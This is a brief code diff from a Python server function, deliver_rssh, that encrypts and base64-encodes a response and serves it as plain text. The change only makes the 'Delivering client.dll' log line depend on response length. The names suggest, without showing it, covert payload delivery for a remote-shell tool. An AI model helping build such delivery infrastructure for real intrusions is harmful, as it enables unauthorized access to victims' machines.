@@ -260,7 +260,9 @@ def deliver_rssh():
 
     encrypted = encrypt(response, hidden_app.key)
     resp = b64encode(encrypted)
-    log.info("Delivering client.dll...")
+    if len(resp) > 1000:
+        log.info("Delivering client.dll...")
+
     return Response(
         resp,
         content_type='text/plain; charset=utf-8'
